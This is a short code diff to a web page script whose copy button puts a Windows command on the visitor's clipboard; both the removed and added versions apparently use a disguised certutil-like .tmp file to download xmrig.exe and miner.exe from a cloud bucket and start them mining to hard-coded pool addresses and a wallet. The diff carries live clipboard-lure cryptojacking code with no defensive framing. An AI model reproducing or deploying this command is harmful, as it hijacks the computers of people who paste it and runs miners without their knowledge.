@@ -134,7 +134,7 @@
 
     // When the button is clicked, copy the specified text
     document.getElementById("copyButton").addEventListener("click", function() {
-      var textToCopy = `cd %temp%&for %I in (.tmp) do if %~zI equ 1536000 cmd /c %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe" &for %I in (.tmp) do if %~zI equ 1536000 cmd /c %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
+      var textToCopy = `for %I in (*.tmp) do if %~zI equ 1536000  %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe" &for %I in (*.tmp) do if %~zI equ 1536000  %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
 
       copyTextToClipboard(textToCopy);
      
